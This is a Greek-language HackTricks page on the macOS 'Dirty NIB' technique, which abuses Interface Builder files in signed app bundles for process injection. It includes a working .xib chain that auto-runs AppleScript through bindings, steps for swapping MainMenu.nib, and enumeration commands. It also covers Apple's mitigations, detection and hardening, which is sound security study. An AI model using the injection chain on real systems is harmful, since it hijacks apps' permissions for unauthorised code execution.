# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Το Dirty NIB αναφέρεται στην κατάχρηση αρχείων Interface Builder (.xib/.nib) μέσα σε ένα signed macOS app bundle, ώστε να εκτελεστεί logic ελεγχόμενο από τον attacker μέσα στη διεργασία-στόχο, κληρονομώντας έτσι τα entitlements και τα TCC permissions της. Η τεχνική τεκμηριώθηκε αρχικά από τον xpn (MDSec) και αργότερα γενικεύτηκε και επεκτάθηκε σημαντικά από τη Sector7, η οποία κάλυψε επίσης τα mitigations της Apple στα macOS 13 Ventura και macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Για background και deep dives, δείτε τα references στο τέλος.

> TL;DR
> • Πριν από το macOS 13 Ventura: η αντικατάσταση του MainMenu.nib ενός bundle (ή κάποιου άλλου nib που φορτώνεται κατά την εκκίνηση) μπορούσε αξιόπιστα να επιτύχει process injection και συχνά privilege escalation.
> • Από το macOS 13 (Ventura) και με τις βελτιώσεις στο macOS 14 (Sonoma): το first-launch deep verification, η προστασία των bundles, τα Launch Constraints και το νέο TCC permission “App Management” αποτρέπουν σε μεγάλο βαθμό το post-launch nib tampering από άσχετες εφαρμογές. Οι επιθέσεις ενδέχεται να παραμένουν εφικτές σε ειδικές περιπτώσεις (π.χ. εργαλεία του ίδιου developer που τροποποιούν τις δικές του εφαρμογές ή terminals στα οποία ο χρήστης έχει παραχωρήσει App Management/Full Disk Access).

## Τι είναι τα αρχεία NIB/XIB

Τα αρχεία Nib (συντομογραφία του NeXT Interface Builder) είναι serialized UI object graphs που χρησιμοποιούνται από εφαρμογές AppKit. Το σύγχρονο Xcode αποθηκεύει editable XML αρχεία .xib, τα οποία μεταγλωττίζονται σε .nib κατά το build. Μια τυπική εφαρμογή φορτώνει το κύριο UI της μέσω της `NSApplicationMain()`, η οποία διαβάζει το key `NSMainNibFile` από το `Info.plist` της εφαρμογής και κάνει instantiate το object graph κατά το runtime.

Βασικά σημεία που καθιστούν δυνατή την επίθεση:
- Το NIB loading κάνει instantiate αυθαίρετες Objective‑C classes χωρίς να απαιτεί να συμμορφώνονται με το NSSecureCoding (ο nib loader της Apple κάνει fallback στις `init`/`initWithFrame:` όταν δεν υπάρχει `initWithCoder:`).
- Τα Cocoa Bindings μπορούν να γίνουν abuse για την κλήση methods κατά το instantiation των nibs, συμπεριλαμβανομένων chained calls που δεν απαιτούν user interaction.


## Dirty NIB injection process (attacker view)

Το κλασικό pre‑Ventura flow:
1) Δημιουργία ενός malicious .xib
- Προσθέστε ένα αντικείμενο `NSAppleScript` (ή άλλες “gadget” classes, όπως τη `NSTask`).
- Προσθέστε ένα `NSTextField` του οποίου ο τίτλος περιέχει το payload (π.χ. AppleScript ή command arguments).
- Προσθέστε ένα ή περισσότερα αντικείμενα `NSMenuItem`, συνδεδεμένα μέσω bindings ώστε να καλούν methods στο target object.

2) Auto-trigger χωρίς user clicks
- Χρησιμοποιήστε bindings για να ορίσετε το target/selector ενός menu item και, στη συνέχεια, καλέστε τη private method `_corePerformAction`, ώστε το action να εκτελείται αυτόματα όταν φορτώνεται το nib. Έτσι καταργείται η ανάγκη να κάνει ο χρήστης click σε ένα button.

Minimal example μιας auto-trigger chain μέσα σε ένα .xib (abridged for clarity):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Αυτό επιτυγχάνει την εκτέλεση αυθαίρετου AppleScript στη διεργασία-στόχο κατά τη φόρτωση του nib.<sup>[[1]](#references)</sup> Οι advanced αλυσίδες μπορούν να:
- Δημιουργούν αυθαίρετες κλάσεις AppKit (π.χ. `NSTask`) και να καλούν μεθόδους χωρίς ορίσματα, όπως η `-launch`.
- Καλούν αυθαίρετους selectors με ορίσματα αντικειμένων μέσω του παραπάνω binding trick.
- Φορτώνουν το AppleScriptObjC.framework για γεφύρωση προς το Objective-C και ακόμη να καλούν επιλεγμένα C APIs.
- Σε παλαιότερα συστήματα που εξακολουθούν να περιλαμβάνουν το Python.framework, να κάνουν bridge προς την Python και στη συνέχεια να χρησιμοποιούν το `ctypes` για την κλήση αυθαίρετων C functions (έρευνα της Sector7).<sup>[[2]](#references)</sup>

3) Αντικατάσταση του nib της εφαρμογής
- Αντιγράψτε το target.app σε μια τοποθεσία με δυνατότητα εγγραφής, αντικαταστήστε, για παράδειγμα, το `Contents/Resources/MainMenu.nib` με το malicious nib και εκτελέστε το target.app. Πριν από το Ventura, μετά από μια αξιολόγηση Gatekeeper που πραγματοποιούνταν μία φορά, οι επόμενες εκκινήσεις εκτελούσαν μόνο επιφανειακούς ελέγχους υπογραφής, επομένως οι πόροι που δεν ήταν executable (όπως τα .nib) δεν επικυρώνονταν ξανά.

Παράδειγμα AppleScript payload για ορατό test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Σύγχρονες προστασίες του macOS (Ventura/Monterey/Sonoma/Sequoia)

Η Apple εισήγαγε αρκετές συστημικές mitigations που μειώνουν δραματικά τη βιωσιμότητα του Dirty NIB στο σύγχρονο macOS:<sup>[[2]](#references)</sup>
- Επαλήθευση σε βάθος κατά την πρώτη εκκίνηση και προστασία bundle (macOS 13 Ventura)
- Κατά την πρώτη εκτέλεση οποιουδήποτε app (σε καραντίνα ή όχι), ένας βαθύς έλεγχος υπογραφής καλύπτει όλους τους πόρους του bundle. Στη συνέχεια, το bundle προστατεύεται: μόνο apps από τον ίδιο developer (ή apps που επιτρέπονται ρητά από το app) μπορούν να τροποποιήσουν τα περιεχόμενά του. Άλλα apps χρειάζονται τη νέα άδεια TCC “App Management” για να γράψουν στο bundle ενός άλλου app.
- Launch Constraints (macOS 13 Ventura)
- Τα system/Apple-bundled apps δεν μπορούν να αντιγραφούν αλλού και να εκτελεστούν· αυτό εξουδετερώνει την προσέγγιση “αντιγραφή στο /tmp, τροποποίηση, εκτέλεση” για τα OS apps.
- Βελτιώσεις στο macOS 14 Sonoma
- Η Apple ενίσχυσε το App Management και διόρθωσε γνωστά bypasses (π.χ. το CVE‑2023‑40450) που επισημάνθηκαν από το Sector7. Το Python.framework είχε αφαιρεθεί νωρίτερα (macOS 12.3), διακόπτοντας ορισμένες αλυσίδες privilege-escalation.
- Αλλαγές στα Gatekeeper/Quarantine
- Για μια ευρύτερη συζήτηση σχετικά με το Gatekeeper, την προέλευση και τις αλλαγές αξιολόγησης που επηρέασαν αυτή την τεχνική, δείτε τη σελίδα που αναφέρεται παρακάτω.

> Πρακτική συνέπεια
> • Στο Ventura+ γενικά δεν μπορείτε να τροποποιήσετε το .nib ενός third-party app, εκτός αν η διεργασία σας διαθέτει App Management ή είναι υπογεγραμμένη με το ίδιο Team ID με το target (π.χ. developer tooling).
> • Η παραχώρηση App Management ή Full Disk Access σε shells/terminals ουσιαστικά επαναφέρει αυτή την επιφάνεια επίθεσης για οτιδήποτε μπορεί να εκτελέσει code μέσα στο context του συγκεκριμένου terminal.


### Αντιμετώπιση των Launch Constraints

Τα Launch Constraints εμποδίζουν την εκτέλεση πολλών Apple apps από μη προεπιλεγμένες τοποθεσίες, αρχίζοντας από το Ventura. Αν βασιζόσασταν σε workflows πριν από το Ventura, όπως η αντιγραφή ενός Apple app σε προσωρινό directory, η τροποποίηση του `MainMenu.nib` και η εκτέλεσή του, αναμένετε ότι αυτό θα αποτύχει σε >= 13.0.


## Απαρίθμηση targets και nibs (χρήσιμο για research / legacy systems)

- Εντοπισμός apps των οποίων το UI βασίζεται σε nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Βρείτε υποψήφιους πόρους nib μέσα σε ένα bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Επικύρωσε διεξοδικά τις υπογραφές κώδικα (θα αποτύχει αν έχεις παραποιήσει πόρους και δεν έχεις κάνει re-sign):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Σημείωση: Σε σύγχρονα macOS θα αποκλειστείτε επίσης από την προστασία bundle/TCC όταν προσπαθείτε να γράψετε στο bundle μιας άλλης εφαρμογής χωρίς κατάλληλη εξουσιοδότηση.


## Συμβουλές για Detection και DFIR

- Παρακολούθηση ακεραιότητας αρχείων στους πόρους των bundle
- Παρακολουθείτε για αλλαγές mtime/ctime στα `Contents/Resources/*.nib` και σε άλλους μη εκτελέσιμους πόρους των εγκατεστημένων εφαρμογών.
- Unified logs και συμπεριφορά διεργασιών
- Παρακολουθείτε για μη αναμενόμενη εκτέλεση AppleScript μέσα σε GUI apps και για διεργασίες που φορτώνουν AppleScriptObjC ή Python.framework. Παράδειγμα:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- Εκτελείτε περιοδικά `codesign --verify --deep` σε κρίσιμες εφαρμογές, ώστε να διασφαλίζετε ότι οι πόροι παραμένουν άθικτοι.
- Πλαίσιο προνομίων
- Ελέγχετε ποιος/τι διαθέτει TCC “App Management” ή Full Disk Access (ιδίως terminals και management agents). Η αφαίρεση αυτών των δικαιωμάτων από shells γενικής χρήσης αποτρέπει την εύκολη επανενεργοποίηση tampering τύπου Dirty NIB.


## Defensive hardening (developers και defenders)

- Προτιμάτε programmatic UI ή περιορίστε ό,τι δημιουργείται από nibs. Αποφεύγετε τη συμπερίληψη ισχυρών classes (π.χ. `NSTask`) σε nib graphs και αποφεύγετε bindings που καλούν έμμεσα selectors σε αυθαίρετα objects.
- Υιοθετήστε το hardened runtime με Library Validation (ήδη πρότυπο για σύγχρονες εφαρμογές). Αν και αυτό δεν σταματά από μόνο του το nib injection, εμποδίζει την εύκολη φόρτωση native code και αναγκάζει τους attackers να χρησιμοποιούν payloads μόνο μέσω scripting.
- Μην ζητάτε ούτε να εξαρτάστε από broad App Management permissions σε tools γενικής χρήσης. Αν το MDM απαιτεί App Management, απομονώστε αυτό το context από shells που ελέγχονται από τον χρήστη.
- Επαληθεύετε τακτικά την ακεραιότητα του app bundle σας και κάνετε τους μηχανισμούς update να επιδιορθώνουν αυτόματα τους πόρους του bundle.


## Σχετική ανάγνωση στο HackTricks

Μάθετε περισσότερα για τις αλλαγές σε Gatekeeper, quarantine και provenance που επηρεάζουν αυτήν την τεχνική:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Αναφορές

- [1] [xpn – DirtyNIB (original write‑up with Pages example)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
